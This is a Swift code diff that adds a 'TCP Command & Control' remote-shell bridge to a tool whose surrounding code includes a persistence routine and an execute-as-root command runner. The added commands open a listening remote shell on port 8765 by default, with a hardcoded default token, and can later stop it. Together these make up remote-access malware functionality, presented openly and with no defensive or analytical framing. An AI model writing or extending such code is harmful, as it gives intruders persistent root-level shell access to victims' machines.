@@ -620,6 +620,27 @@ private func _regPersistence() {
             ? .ok(String(format: "execute-as-root: ✔  pid=%d  exit=0  cmd: %@", spawnPid, cmd))
             : .fail(String(format: "execute-as-root: ✖  pid=%d  exit=%d  cmd: %@", spawnPid, code, cmd))
     }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // REMOTE BRIDGE — TCP Command & Control
+    // ═══════════════════════════════════════════════════════════════════════
+
+    OmegaCore.register("bridge-start") { arg, mgr in
+        let parts = arg.split(separator: " ").map(String.init)
+        let port = UInt16(parts.first ?? "8765") ?? 8765
+        let token = parts.count > 1 ? parts[1] : "L4RA-2026-SECURE"
+        let result = RemoteBridgeManager.shared.start(port: port, token: token, mgr: mgr)
+        return .ok(result)
+    }
+
+    OmegaCore.register("bridge-stop") { _, _ in
+        RemoteBridgeManager.shared.stop()
+        return .ok("Bridge stopped. All connections closed.")
+    }
+
+    OmegaCore.register("bridge-status") { _, _ in
+        return .ok("bridge-start [port] [token]  — Start TCP remote shell\nbridge-stop                — Stop remote bridge")
+    }
 }
 
 // MARK: §10 Help
